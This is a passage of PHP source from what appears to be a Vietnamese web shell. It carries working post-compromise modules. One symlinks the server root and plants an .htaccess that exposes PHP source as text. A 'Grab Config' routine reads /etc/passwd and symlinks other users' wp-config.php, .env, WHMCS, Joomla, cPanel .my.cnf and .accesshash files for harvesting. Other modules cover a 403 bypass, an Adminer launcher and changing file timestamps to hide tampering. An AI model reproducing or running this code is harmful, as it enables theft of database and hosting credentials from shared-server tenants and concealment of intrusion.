                            <div class="mt-6 p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
                                <div class="flex items-center gap-2">
                                    <svg class="w-5 h-5 text-red-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd"/></svg>
                                    <span class="text-red-400 font-medium text-sm">Dữ liệu đầu vào không được để trống!</span>
                                </div>
                            </div>
                        <?php else: ?>
                            <?php $encoded = base64_encode($b64dencode); ?>
                            <div class="mt-6">
                                <div class="flex items-center justify-between mb-4">
                                    <h3 class="text-lg font-semibold text-green-400">Kết Quả Mã Hóa</h3>
                                    <button onclick="copyToClipboard('encoded-output')" class="cyber-btn-outline inline-flex items-center gap-1 px-3 py-1.5 rounded-lg text-xs">
                                        <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7v8a1 1 0 0 0 1 1h6M8 7V6a1 1 0 0 1 1-1h6a1 1 0 0 1 1 1v1m0 0v8a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1V7m0 0H6"/></svg>
                                        Sao Chép
                                    </button>
                                </div>
                                <textarea id="encoded-output" rows="4" class="cyber-input block w-full p-4 text-sm rounded-xl font-mono" readonly><?=htmlspecialchars($encoded)?></textarea>
                            </div>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>
                <?php
                }
                
                // ==================== SYMLINK VHOSTS ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "symvhosts"){
?>
<div class="glass-effect rounded-2xl p-6 animate-fade-in">
    <div class="flex items-center gap-3 mb-6">
        <svg class="w-8 h-8 text-teal-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"/></svg>
        <div>
            <h2 class="text-2xl font-bold text-teal-400">Symlink Vhosts</h2>
            <p class="text-sm text-teal-400/60">Tạo liên kết tượng trưng cho máy chủ ảo</p>
        </div>
    </div>
    
    <form action="" method="post">
        <div class="mb-6">
            <p class="text-sm text-teal-400/70 mb-4">Công cụ này sẽ tạo liên kết tượng trưng để truy cập cấu hình máy chủ ảo.</p>
            <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="createsymvhost">
                <span class="flex items-center justify-center gap-2">
                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"/></svg>
                    Tạo Symlink Vhosts
                </span>
            </button>
        </div>
    </form>
    
    <?php if(isset($_POST["createsymvhost"])): ?>
        <?php
        // Kiểm tra và thực thi với error suppression
        $system_available = function_exists('system') && strpos(ini_get('disable_functions'), 'system') === false;
        $symlink_available = function_exists('symlink') && strpos(ini_get('disable_functions'), 'symlink') === false;
        
        $system_success = false;
        $symlink_success = false;
        $htaccess_success = false;
        
        // Thử tạo symlink bằng system command
        if ($system_available) {
            @system('ln -s / fastvnteam_vhosts.txt 2>&1', $system_return);
            $system_success = ($system_return === 0);
        }
        
        // Tạo .htaccess
        $b64htacs = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
        $htaccess_content = base64_decode($b64htacs);
        $htaccess_success = (@error_log($htaccess_content, 3, $path . "/.htaccess") !== false);
        
        // Thử tạo symlink bằng PHP function
        if ($symlink_available) {
            $symlink_success = @symlink("/", "fastvnteam_vhosts.txt");
        }
        
        // Hiển thị kết quả
        $overall_success = $system_success || $symlink_success;
        
        if ($overall_success && $htaccess_success):
        ?>
        <div class="mt-6 p-4 bg-green-500/10 border border-green-500/30 rounded-xl">
            <div class="flex items-center gap-2">
                <svg class="w-5 h-5 text-green-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm13.707-1.293a1 1 0 0 0-1.414-1.414L11 12.586l-1.793-1.793a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.414 0l4-4Z" clip-rule="evenodd"/></svg>
                <span class="text-green-400 font-medium text-sm">Symlink đã được tạo thành công!</span>
            </div>
            <div class="mt-3">
                <a href="fastvnteam_vhosts.txt" target="_blank" class="inline-flex items-center text-sm text-green-400 hover:text-green-300 no-underline">
                    <svg class="w-4 h-4 mr-1" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 14v4.833A1.166 1.166 0 0 1 16.833 20H5.167A1.167 1.167 0 0 1 4 18.833V7.167A1.166 1.166 0 0 1 5.167 6h4.618m4.447-2H20v5.768m-7.889 2.121 7.778-7.778"/></svg>
                    Mở fastvnteam_vhosts.txt
                </a>
            </div>
            <?php if (!$symlink_available): ?>
            <p class="mt-2 text-xs text-yellow-400/70">Lưu ý: Hàm <code>symlink()</code> đã bị vô hiệu hóa, sử dụng phương thức thay thế.</p>
            <?php endif; ?>
        </div>
        <?php elseif ($htaccess_success && !$overall_success): ?>
        <div class="mt-6 p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-xl">
            <div class="flex items-center gap-2">
                <svg class="w-5 h-5 text-yellow-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm9.408-5.5a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2h-.01ZM10 10a1 1 0 1 0 0 2h1v3h-1a1 1 0 1 0 0 2h4a1 1 0 1 0 0-2h-1v-4a1 1 0 0 0-1-1h-2Z" clip-rule="evenodd"/></svg>
                <span class="text-yellow-400 font-medium text-sm">Đã tạo .htaccess nhưng không thể tạo symlink!</span>
            </div>
            <p class="mt-2 text-xs text-yellow-400/70">Cả <code>system()</code> và <code>symlink()</code> đều đã bị vô hiệu hóa trên máy chủ này.</p>
            <p class="mt-1 text-xs text-yellow-400/70">Bạn có thể thử tạo symlink thủ công qua SSH hoặc sử dụng phương thức khác.</p>
        </div>
        <?php else: ?>
        <div class="mt-6 p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
            <div class="flex items-center gap-2">
                <svg class="w-5 h-5 text-red-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd"/></svg>
                <span class="text-red-400 font-medium text-sm">Không thể tạo symlink!</span>
            </div>
            <p class="mt-2 text-xs text-red-400/70">
                <?php if (!$system_available && !$symlink_available): ?>
                Cả <code>system()</code> và <code>symlink()</code> đều đã bị vô hiệu hóa.
                <?php elseif (!$htaccess_success): ?>
                Không thể ghi file <code>.htaccess</code>. Vui lòng kiểm tra quyền ghi thư mục.
                <?php else: ?>
                Đã xảy ra lỗi không xác định khi tạo symlink.
                <?php endif; ?>
            </p>
        </div>
        <?php endif; ?>
    <?php endif; ?>
</div>
<?php
}
                
                // ==================== SYMLINK 403 BYPASS ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "sym403"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-purple-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 18.364A9 9 0 0 0 5.636 5.636m12.728 12.728A9 9 0 0 1 5.636 5.636m12.728 12.728L5.636 5.636"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold text-purple-400">Symlink 403 Bypass</h2>
                            <p class="text-sm text-purple-400/60">Vượt qua hạn chế 403 Forbidden</p>
                        </div>
                    </div>
                    
                    <form action="" method="post">
                        <div class="mb-6">
                            <p class="text-sm text-purple-400/70 mb-4">Công cụ này sẽ tạo symlink để vượt qua lỗi 403 forbidden.</p>
                            <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="createsym403">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 18.364A9 9 0 0 0 5.636 5.636m12.728 12.728A9 9 0 0 1 5.636 5.636m12.728 12.728L5.636 5.636"/></svg>
                                    Tạo Symlink 403 Bypass
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
                <?php
                }
                
                // ==================== GRAB CONFIG ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "grabconfig"){
                    ini_set('max_execution_time', 0);
                    @ini_set('display_errors', 0);
                    @ini_set('file_uploads', 1);
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-red-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12 7-7 7 7M5 12l7 7 7-7"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold text-red-400">Thu Thập Cấu Hình</h2>
                            <p class="text-sm text-red-400/60">Trích xuất tập tin cấu hình từ người dùng</p>
                        </div>
                    </div>
                    
                    <form class="mt-4" method="post" action="">
                        <div class="mb-6">
                            <label for="passwd" class="block mb-3 text-sm font-medium text-green-400">Danh Sách Người Dùng:</label>
                            <textarea name="passwd" id="passwd" rows="8" class="cyber-input block w-full p-4 text-sm rounded-xl" placeholder="mỗi dòng một người dùng" required><?php $uSr = file("/etc/passwd"); foreach($uSr as $usrr){ $str = explode(":", $usrr); echo $str[0] . "\n"; } ?></textarea>
                        </div>
                        
                        <input type="hidden" class="input" name="folfig" value="nemesis_config" />
                        
                        <div class="mb-6">
                            <label for="grabtype" class="block mb-3 text-sm font-medium text-green-400">Loại Tập Tin Đầu Ra:</label>
                            <select id="grabtype" name="grabtype" class="cyber-select block w-full p-4 text-sm rounded-xl">
                                <option title="type txt" value=".txt" selected>.txt</option>
                                <option title="type php" value=".php">.php</option>
                                <option title="type shtml" value=".shtml">.shtml</option>
                                <option title="type ini" value=".ini">.ini</option>
                                <option title="type html" value=".html">.html</option>
                            </select>
                        </div>
                        
                        <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="conf">
                            <span class="flex items-center justify-center gap-2">
                                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12 7-7 7 7M5 12l7 7 7-7"/></svg>
                                Thu Thập Cấu Hình
                            </span>
                        </button>
                    </form>
                    
                    <?php if(isset($_POST['conf'])): ?>
                        <?php
                        $v = "var";
                        $folfig = $_POST['folfig'];
                        $type = $_POST['grabtype'];
                        @mkdir($folfig, 0755);
                        @chdir($folfig);
                        $confhtacs = "T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCAubXkuY25mDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRUeXBlIHR4dCAubXkuY25mDQpBZGRUeXBlIHR4dCAuYWNjZXNzaGFzaA0KQWRkSGFuZGxlciB0eHQgLnBocA0KQWRkSGFuZGxlciB0eHQgLmNuZg0KQWRkSGFuZGxlciB0eHQgLmFjY2Vzc2hhc2g=";
                        error_log(base64_decode($confhtacs), 3, $path . "/" . $folfig . "/.htaccess");
                        $passwd = explode("\n", $_POST["passwd"]);
                        foreach($passwd as $pwd){
                            $user = trim($pwd);
                            // WordPress
                            symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-Wp1.txt');
                            symlink('/home/' . $user . '/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
                            symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-Wp2.txt');
                            symlink('/home/' . $user . '/public_html/web/wp-config.php', $user . '-Wp3.txt');
                            symlink('/home1/' . $user . '/public_html/wp-config.php', $user . '-WpHm1.txt');
                            symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-WpHm2.txt');
                            symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-WpHm3.txt');
                            symlink('/var/www/html/wp-config.php', $v . '-wp1.txt');
                            
                            // vBulletin
                            symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
                            symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
                            symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
                            
                            // phpBB
                            symlink('/home/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
                            
                            // Laravel
                            symlink('/home/' . $user . '/public_html/.env', $user . '-Laravel1.txt');
                            symlink('/home/' . $user . '/public_html/web/.env', $user . '-Laravel2.txt');
                            symlink('/home/' . $user . '/public_html/public/.env', $user . '-Laravel3.txt');
                            symlink('/var/www/html/.env', $v . '-LaravelV.txt');
                            
                            // Joomla
                            symlink('/home/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
                            symlink('/home/' . $user . '/public_html/html/configuration.php', $user . '-Joomla2.txt');
                            symlink('/home/' . $user . '/public_html/web/configuration.php', $user . '-Joomla3.txt');
                            
                            // WHMCS
                            symlink('/home/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
                            symlink('/home/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
                            symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
                            symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
                            symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
                            symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
                            symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
                            symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
                            symlink('/home/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
                            
                            // Magento
                            symlink('/home/' . $user . '/public_html/app/etc/local.xml', $user . '-Magento.txt');
                            
                            // Joomla (duplicate from original)
                            symlink('/home/' . $user . '/public_html/configuration.php', $user . '-Joomla.txt');
                            
                            // CodeIgniter
                            symlink('/home/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter.txt');
                            symlink('/home/' . $user . '/public_html/web/application/config/database.php', $user . '-CodeIgniterH.txt');
                            symlink('/home1/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter1.txt');
                            symlink('/home2/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter2.txt');
                            symlink('/home3/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter3.txt');
                            
                            // cPanel/WHM
                            symlink('/home/' . $user . '/.my.cnf', $user . '-cpanel.txt');
                            symlink('/home/' . $user . '/.accesshash', $user . '-whm.txt');
                            
                            // OpenCart
                            symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-opencart.txt');
                            
                            // Magento (duplicate)
                            symlink('/home/' . $user . '/public_html/app/etc/local.xml', $user . '-mangento.txt');
                        }
                        ?>
                        <div class="mt-6 p-4 bg-green-500/10 border border-green-500/30 rounded-xl">
                            <div class="flex items-center gap-2">
                                <svg class="w-5 h-5 text-green-400 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm13.707-1.293a1 1 0 0 0-1.414-1.414L11 12.586l-1.793-1.793a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.414 0l4-4Z" clip-rule="evenodd"/></svg>
                                <span class="text-green-400 font-medium text-sm">Đã thu thập cấu hình thành công!</span>
                            </div>
                            <div class="mt-3">
                                <a href="<?=$folfig?>" target="_blank" class="inline-flex items-center text-sm text-green-400 hover:text-green-300 no-underline">
                                    <svg class="w-4 h-4 mr-1" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 14v4.833A1.166 1.166 0 0 1 16.833 20H5.167A1.167 1.167 0 0 1 4 18.833V7.167A1.166 1.166 0 0 1 5.167 6h4.618m4.447-2H20v5.768m-7.889 2.121 7.778-7.778"/></svg>
                                    Mở Thư Mục <?=$folfig?>
                                </a>
                            </div>
                        </div>
                    <?php endif; ?>
                </div>
                <?php
                }
                
                // ==================== ADMINER ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "adminer"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-cyan-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75c0 2.278-3.694 4.125-8.25 4.125S3.75 12.403 3.75 10.125V6.375"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold text-cyan-400">Adminer - Quản Lý CSDL</h2>
                            <p class="text-sm text-cyan-400/60">Khởi tạo Adminer để quản lý cơ sở dữ liệu</p>
                        </div>
                    </div>
                    
                    <form action="" method="post">
                        <div class="mb-6">
                            <p class="text-sm text-cyan-400/70 mb-4">Công cụ này sẽ khởi tạo Adminer để quản lý cơ sở dữ liệu.</p>
                            <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="createadminer">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75c0 2.278-3.694 4.125-8.25 4.125S3.75 12.403 3.75 10.125V6.375"/></svg>
                                    Khởi Tạo Adminer
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
                <?php
                }
                
                // ==================== CHANGE DATE ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "changedate" && isset($_GET["item"])){
                    $itemPath = $path . "/" . $_GET["item"];
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-orange-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 10h16M8 14h8m-4-9v16m-7 0h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2Z"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold text-orange-400">Thay Đổi Ngày/Giờ</h2>
                            <p class="text-sm text-orange-400/60">Sửa đổi dấu thời gian của: <code class="text-green-400/80"><?=htmlspecialchars($_GET["item"])?></code></p>
                        </div>
                    </div>
                    
                    <form method="post" action="">
                        <div class="mb-6">
                            <label for="new_date" class="block mb-3 text-sm font-medium text-green-400">Ngày/Giờ Mới:</label>
                            <input type="text" id="new_date" name="new_date" class="cyber-input block w-full p-4 text-sm rounded-xl" value="<?=filedate($itemPath)?>" placeholder="Định dạng: Tháng Ngày Năm Giờ:Phút:Giây" required>
                            <p class="mt-2 text-sm text-green-400/50">Ngày hiện tại: <?=filedate($itemPath)?></p>
                            <button class="cyber-btn mt-4 w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="changedate">
                                <span class="flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 10h16M8 14h8m-4-9v16m-7 0h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2Z"/></svg>
                                    Thay Đổi Ngày/Giờ
                                </span>
                            </button>
                        </div>
                    </form>
                </div>
                <?php
                }
                
                // ==================== NEW FILE ====================
                elseif(isset($_GET["path"]) && @$_GET["action"] === "newfile"){
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center gap-3 mb-6">
                        <svg class="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.5v15m7.5-7.5h-15"/></svg>
                        <div>
                            <h2 class="text-2xl font-bold cyber-text-strong">Tạo Tập Tin Mới</h2>
                            <p class="text-sm text-green-400/60">Tạo tập tin mới trong thư mục hiện tại</p>
                        </div>
                    </div>
                    
                    <form id="handle_file" method="post" action="">
                        <div class="mb-6">
                            <label for="file_name_new" class="block mb-3 text-sm font-medium text-green-400">Tên Tập Tin:</label>
                            <input type="text" id="file_name_new" name="file_name" class="cyber-input block w-full p-4 text-sm rounded-xl" placeholder="ten-tap-tin.ext" required>
                        </div>

                        <div class="mb-6">
                            <label for="new_file_content" class="block mb-3 text-sm font-medium text-green-400">Nội Dung Tập Tin:</label>
                            <textarea id="new_file_content" name="new_file_content" rows="12" class="cyber-input block w-full p-4 text-sm rounded-xl"></textarea>
                        </div>

                        <div class="mb-6">
                            <label for="new_file_method" class="block mb-3 text-sm font-medium text-green-400">Phương Thức Tạo:</label>
                            <select id="new_file_method" name="new_file_method" class="cyber-select block w-full p-4 text-sm rounded-xl">
                                <option value="basic">Sử dụng ghi tập tin cơ bản</option>
                                <option value="cmd">Sử dụng lệnh hệ thống</option>
                            </select>
                            <p class="mt-2 text-sm text-green-400/50">Lưu ý: Phương thức lệnh có thể thất bại với nội dung quá dài.</p>
                        </div>
                        
                        <button class="cyber-btn w-full text-black font-bold rounded-lg text-sm px-5 py-3.5" type="submit" name="newfile">
                            <span class="flex items-center justify-center gap-2">
                                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.5v15m7.5-7.5h-15"/></svg>
                                Tạo Tập Tin
                            </span>
                        </button>
                    </form>
                </div>
                <?php
                }
                
                // ==================== VIEW FILE ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "view" && isset($_GET["file"])){
                    $filePath = $path . "/" . $_GET["file"];
                    if(file_exists($filePath) && is_file($filePath)){
                        ob_start();
                        readfile($filePath);
                        $fileContent = ob_get_clean();
                ?>
                <div class="glass-effect rounded-2xl p-6 animate-fade-in">
                    <div class="flex items-center justify-between mb-6">
                        <div class="flex items-center gap-3">
                            <svg class="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 12V5a1 1 0 0 1 1-1h1a1 1 0 0 1 1 1v7m0 0v3a1 1 0 0 1-1 1h-1a1 1 0 0 1-1-1v-3m0 0H5m5 0h5"/></svg>
                            <div>
                                <h2 class="text-xl font-bold cyber-text-strong">Xem Tập Tin</h2>
                                <p class="text-sm text-green-400/60">Đang xem: <code class="text-green-400/80"><?=htmlspecialchars($_GET["file"])?></code></p>
                            </div>
                        </div>
                        <div class="flex gap-2">
                            <a href="?path=<?=$path?>&file=<?=$file?>&action=edit<?=$toPage?>" class="action-icon no-underline" title="Chỉnh sửa">
                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11.32 6.176H5c-1.105 0-2 .949-2 2.118v10.588C3 20.052 3.895 21 5 21h11c1.105 0 2-.948 2-2.118v-7.75l-3.914 4.144A2.46 2.46 0 0 1 12.81 16l-2.681.568c-1.75.37-3.292-1.263-2.942-3.115l.536-2.839c.097-.512.335-.983.684-1.352l2.914-3.086Z" clip-rule="evenodd"/><path fill-rule="evenodd" d="M19.846 4.318a2.148 2.148 0 0 0-.437-.692 2.014 2.014 0 0 0-.654-.463 1.92 1.92 0 0 0-1.544 0 2.014 2.014 0 0 0-.654.463l-.546.578 2.852 3.02.546-.579a2.14 2.14 0 0 0 .437-.692 2.244 2.244 0 0 0 0-1.635ZM17.45 8.721 14.597 5.7 9.82 10.76a.54.54 0 0 0-.137.27l-.536 2.84c-.07.37.239.696.588.622l2.682-.567a.492.492 0 0 0 .255-.145l4.778-5.06Z" clip-rule="evenodd"/></svg>
                            </a>
                            <button onclick="postDownload('<?=addslashes($filePath)?>')" class="action-icon" title="Tải xuống">
                                <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 15v2a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-2m-8 1V4m0 12-4-4m4 4 4-4"/></svg>
                            </button>
                            <a href="?path=<?=$path?>&file=<?=$file?>&action=renamefile&search=<?=$search.$toPage?>" class="action-icon no-underline" title="Đổi tên">
                                <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28"/></svg>
                            </a>
                            <a href="?path=<?=$path?>&file=<?=$file?>&action=chmodfile&search=<?=$search.$toPage?>" class="action-icon no-underline" title="Phân quyền">
                                <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v-3m0 0V9m0 3H9m3 0h3m-3 8a9 9 0 1 1 0-18 9 9 0 0 1 0 18Z"/></svg>
                            </a>
                            <a href="?path=<?=$path?>&file=<?=$file?>&action=deletefile&search=<?=$search.$toPage?>" class="action-icon delete no-underline" title="Xóa" onclick="return confirm('Bạn có chắc chắn muốn xóa tập tin này?')">
                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd"/></svg>
                            </a>
                        </div>
                    </div>
                    
                    <?php
                    $fileExt = pathinfo($filePath, PATHINFO_EXTENSION);
                    $imageExtensions = ["jpg", "jpeg", "png", "gif", "bmp", "webp", "svg", "ico"];
                    if(in_array(strtolower($fileExt), $imageExtensions)){
                        $mimeType = mime_content_type($filePath);
                        $base64 = base64_encode(file_get_contents($filePath));
                        echo '<div class="glass-effect rounded-xl p-4 flex items-center justify-center"><img src="data:' . $mimeType . ';base64,' . $base64 . '" alt="Hình ảnh" class="max-w-full h-auto max-h-[500px] rounded-lg"></div>';
                    } else {
                        echo '<textarea class="cyber-input block w-full p-4 text-sm rounded-xl font-mono" rows="20" readonly>' . htmlspecialchars($fileContent) . '</textarea>';
                    }
                    ?>
                </div>
                <?php
                    } else {
                        echo '<div class="glass-effect rounded-2xl p-12 text-center animate-fade-in"><svg class="w-16 h-16 text-red-400 mx-auto mb-4" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18 17.94 6M18 18 6.06 6"/></svg><h3 class="text-lg font-semibold text-red-400 mb-2">Không Tìm Thấy Tập Tin</h3><p class="text-green-400/60">Tập tin được yêu cầu không tồn tại hoặc không thể đọc</p></div>';
                    }
                }
                
                // ==================== EDIT FILE ====================
                elseif(isset($_GET["action"]) && $_GET["action"] === "edit" && isset($_GET["file"])){
